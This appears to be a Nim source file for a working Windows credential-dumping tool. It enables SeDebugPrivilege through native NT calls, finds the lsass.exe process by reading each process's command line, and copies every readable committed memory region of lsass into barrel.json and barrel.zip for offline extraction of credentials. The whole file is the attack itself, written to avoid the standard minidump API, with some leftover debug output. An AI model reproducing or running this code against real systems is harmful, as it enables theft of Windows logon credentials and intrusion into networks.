import winim/lean
import strformat
import strutils
import zippy/ziparchives
import tables


const
  MAX_PATH = 260
  ProcessBasicInformationSize = 48
  PebOffset = 0x8
  LdrOffset = 0x18
  InInitializationOrderModuleListOffset = 0x30
  FLinkDllBaseOffset = 0x20
  FLinkBufferFullDllNameOffset = 0x40
  FLinkBufferOffset = 0x50
  MAX_MEMFILES = 1024

type
  MemFile* = object
    filename*: string
    content*: ptr UncheckedArray[byte]
    size*: csize_t

type
  Luid* = object
    lowPart*: DWORD
    highPart*: DWORD

  TokenPrivileges* = object
    privilegeCount*: DWORD
    luid*: Luid
    attributes*: DWORD

type
  PROCESSINFOCLASS* = enum
    ProcessBasicInformation = 0

type MEMORY_INFORMATION_CLASS* = enum
    MemoryBasicInformation = 0


proc NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtOpenProcessToken".}
proc NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: ptr TokenPrivileges, BufferLength: DWORD, PreviousState: PVOID, ReturnLength: PDWORD): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtAdjustPrivilegesToken".}
proc NtClose(Handle: HANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtClose".}
proc NtGetNextProcess(ProcessHandle: HANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Flags: ULONG, NewProcessHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtGetNextProcess".}
proc NtQueryInformationProcess(ProcessHandle: HANDLE, ProcessInformationClass: PROCESSINFOCLASS, ProcessInformation: PVOID, ProcessInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryInformationProcess".}
proc NtReadVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: SIZE_T, NumberOfBytesRead: PSIZE_T): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtReadVirtualMemory".}
proc NtQueryVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, MemoryInformationClass: MEMORY_INFORMATION_CLASS, MemoryInformation: PVOID, MemoryInformationLength: SIZE_T, ReturnLength: PSIZE_T): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryVirtualMemory".}


proc enableDebugPrivileges*() =
  let currentProcess = GetCurrentProcess()
  var tokenHandle: HANDLE

  # Open process token
  let openStatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY or TOKEN_ADJUST_PRIVILEGES, addr tokenHandle)
  if openStatus != 0:
    echo "[-] NtOpenProcessToken failed. NTSTATUS: 0x", toHex(cast[int32](openStatus), 8)
    quit(-1)

  # Prepare privilege structure
  var tp = TokenPrivileges(
    privilegeCount: 1,
    luid: Luid(lowPart: 20, highPart: 0),
    attributes: SE_PRIVILEGE_ENABLED
  )

  # Adjust token privileges
  let adjustStatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, addr tp, DWORD(sizeof(tp)), nil, nil)
  if adjustStatus != 0:
    echo "[-] NtAdjustPrivilegesToken failed. NTSTATUS: 0x", toHex(cast[int32](adjustStatus), 8)
    NtClose(tokenHandle)
    quit(-1)

  # Cleanup
  NtClose(tokenHandle)

  echo "[+] SeDebugPrivilege successfully enabled"


proc readRemoteIntPtr*(hProcess: HANDLE, memAddress: PVOID): PVOID =
    var
        buff: array[8, BYTE]
        bytesRead: SIZE_T
    
    let ntstatus = NtReadVirtualMemory(
        hProcess,
        memAddress,
        addr buff[0],
        sizeof(buff).SIZE_T,
        addr bytesRead
    )

    # Allowed status codes: SUCCESS (0), ACCESS_VIOLATION (0xC0000005), INVALID_PARAMETER (0x8000000D)
    if ntstatus != 0 and ntstatus != 0xC0000005 and ntstatus != 0x8000000D and hProcess != 0:
        echo fmt"[-] Error calling NtReadVirtualMemory (readRemoteIntPtr). NTSTATUS: 0x{cast[int](ntstatus):X} reading address 0x{cast[int](memAddress):X}"
        return nil
    
    result = cast[PVOID](cast[ptr int64](addr buff[0])[])


proc readRemoteWStr*(hProcess: HANDLE, memAddress: PVOID): string =
    var
        buff: array[256, BYTE]
        bytesRead: SIZE_T
    
    let ntstatus = NtReadVirtualMemory(
        hProcess,
        memAddress,
        addr buff[0],
        sizeof(buff).SIZE_T,
        addr bytesRead
    )

    if ntstatus != 0 and ntstatus != 0xC0000005 and ntstatus != 0x8000000D and hProcess != 0:
        echo fmt"[-] Error calling NtReadVirtualMemory (readRemoteWStr). NTSTATUS: 0x{cast[int](ntstatus):X} reading address 0x{cast[int](memAddress):X}"

    var unicodeStr = ""
    var i = 0
    while i < sizeof(buff) - 1:
        if buff[i] == 0 and buff[i+1] == 0:
            break
        
        let wch = cast[ptr WCHAR](addr buff[i])[]
        unicodeStr.add(char(wch))
        i += 2
    
    return unicodeStr


proc getProcNameFromHandle*(processHandle: HANDLE): string =
    const
        ProcessBasicInformationSize = 48
        PebOffset = 0x8
        CommandLineOffset = 0x68
        ProcessParametersOffset = 0x20

    var
        pbiByteArray: array[ProcessBasicInformationSize, BYTE]
        returnLength: ULONG

    # Query process information
    let ntstatus = NtQueryInformationProcess(
        processHandle,
        ProcessBasicInformation,  # Note: Using the enum value, not the type
        cast[PVOID](addr pbiByteArray[0]),
        ProcessBasicInformationSize.ULONG,
        addr returnLength
    )

    if ntstatus != 0:
        echo fmt"[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{cast[int](ntstatus):08X}"
        return ""

    # Rest of the implementation remains the same...
    # Get PEB Base Address
    let pebPointer = cast[PVOID](cast[uint](addr pbiByteArray[0]) + PebOffset)
    let pebAddress = cast[PVOID](cast[ptr PVOID](pebPointer)[])

    # Get PEB->ProcessParameters
    let processParametersPointer = cast[PVOID](cast[uint](pebAddress) + ProcessParametersOffset)

    # Get ProcessParameters->CommandLine
    let processParametersAddress = readRemoteIntPtr(processHandle, processParametersPointer)
    let commandLinePointer = cast[PVOID](cast[uint](processParametersAddress) + CommandLineOffset)
    let commandLineAddress = readRemoteIntPtr(processHandle, commandLinePointer)
    let commandLineValue = readRemoteWStr(processHandle, commandLineAddress)

    return commandLineValue


proc toLowercase*(str: var string) =
    ## Converts a string to lowercase in-place (modifies original)
    for i in 0..<str.len:
        str[i] = str[i].toLowerAscii()


proc getProcessByName*(procName: string): HANDLE =
    let targetName = procName.toLowerAscii()  # Use Nim's built-in
    
    var auxHandle: HANDLE = 0
    while NT_SUCCESS(NtGetNextProcess(auxHandle, MAXIMUM_ALLOWED, 0, 0, addr auxHandle)):
        let currentName = getProcNameFromHandle(auxHandle).toLowerAscii()
        if currentName == targetName:
            return auxHandle
    return 0


proc GenerateZip*(zipFilename: string, memfiles: openArray[MemFile]): bool =
  ## Crea un ZIP a partir de archivos en memoria usando Zippy (createZipArchive)
  try:
    var files = initTable[string, string]()

    for memfile in memfiles:
      if not memfile.content.isNil and memfile.size > 0:
        let filename = memfile.filename
        if filename.len > 0:
          var data = newString(memfile.size)
          copyMem(addr data[0], memfile.content, memfile.size)
          files[filename] = data

    let zipData = createZipArchive(files)
    writeFile(zipFilename, zipData)

    echo "[+] File ", zipFilename, "  generated correctly"
    return true
  except:
    echo "[-] Error al generar el ZIP"
    return false


when isMainModule:
  enableDebugPrivileges()
  let hProcess = getProcessByName("C:\\WINDOWS\\system32\\lsass.exe")
  if hProcess == 0:
    quit(-1)

  # Initialize scan variables
  var
    memfileList: array[MAX_MEMFILES, MemFile]
    memfileCount = 0
    jsonOutput = "["
    jsonItem = newString(256)
    procMaxAddress = 0x7FFFFFFEFFFF'u64
    memAddress: PVOID = nil
    auxSize = 0
    auxName: array[MAX_PATH, char]

  while cast[uint64](memAddress) < procMaxAddress:
    var mbi: MEMORY_BASIC_INFORMATION
    var returnSize: SIZE_T

    let ntstatus = NtQueryVirtualMemory(
        hProcess,
        memAddress,
        MemoryBasicInformation,
        addr mbi,
        sizeof(mbi).SIZE_T,
        addr returnSize
    )
    
    if ntstatus != 0:
        echo fmt"[-] Error NtQueryVirtualMemory: 0x{ntstatus:X}"
        break

    if mbi.Protect != PAGE_NOACCESS and mbi.State == MEM_COMMIT and ((mbi.Protect and PAGE_GUARD) == 0):
        let filename = "0X" & fmt"{cast[int](mbi.BaseAddress):X}"
        
        let regionSize = mbi.RegionSize
        let buffer = cast[ptr UncheckedArray[byte]](alloc(regionSize))
        var bytesRead: SIZE_T = 0

        ### echo fmt"[+] Dumping {filename} ({regionSize} bytes)"
        let status = NtReadVirtualMemory(hProcess, mbi.BaseAddress, buffer, regionSize, addr bytesRead)
        let unsignedStatus = cast[uint32](status)
        if mbi.Protect == 260 or mbi.Protect == 258:
          echo "bbb"
          echo "status ",status
          echo "unsignedStatus ",unsignedStatus

        const STATUS_SUCCESS = 0x00000000'u32
        const STATUS_PARTIAL_COPY = 0x8000000D'u32

        if unsignedStatus != STATUS_SUCCESS and unsignedStatus != STATUS_PARTIAL_COPY:
            echo fmt"[-] Error reading 0x{cast[int](mbi.BaseAddress):X} (NTSTATUS: 0x{unsignedStatus:08X})"
            dealloc(buffer)
            break

        jsonOutput.add(fmt"""{{"field0":"{filename}","field1":"0X{cast[int](mbi.BaseAddress):X}","field2":{regionSize}}},""")

        ## DEBUG
        var hexBytes = ""
        if regionSize > 0:
            hexBytes = newStringOfCap(36)  # 12 bytes * 3 caracteres (máximo)
            for i in 0..<min(12, regionSize):
                hexBytes.add(fmt"{buffer[i]:02X}")
                if i < min(12, regionSize) - 1:  # Añadir espacio solo entre bytes
                    hexBytes.add(" ")
        #echo fmt"""{{"region":"{filename}","size":{regionSize},"first_bytes":"{hexBytes}"}}"""

        # Create MemFile
        if memfileCount < MAX_MEMFILES:
            memfileList[memfileCount] = MemFile(
                filename: filename,
                content: buffer,
                size: cast[csize_t](regionSize)
            )
            inc memfileCount
        else:
            echo "[-] ¡Lista de MemFiles llena! Omitiendo región."
            dealloc(buffer)

    # Next region
    memAddress = cast[PVOID](cast[uint64](memAddress) + cast[uint64](mbi.RegionSize))

  echo fmt"[+] Number of memory regions: {memfileCount}"

  # Finalize JSON output (remove trailing comma and close array)
  if jsonOutput.len > 1:
    jsonOutput.setLen(jsonOutput.len-2) # Remove last ", "
  jsonOutput.add("}]")
  let json_filename = "barrel.json"
  let zip_filename = "barrel.zip"
  writeFile(json_filename, $jsonOutput)
  echo "[+] File ", json_filename, " generated correctly"

  let zip_generated = GenerateZip(zip_filename, memfileList)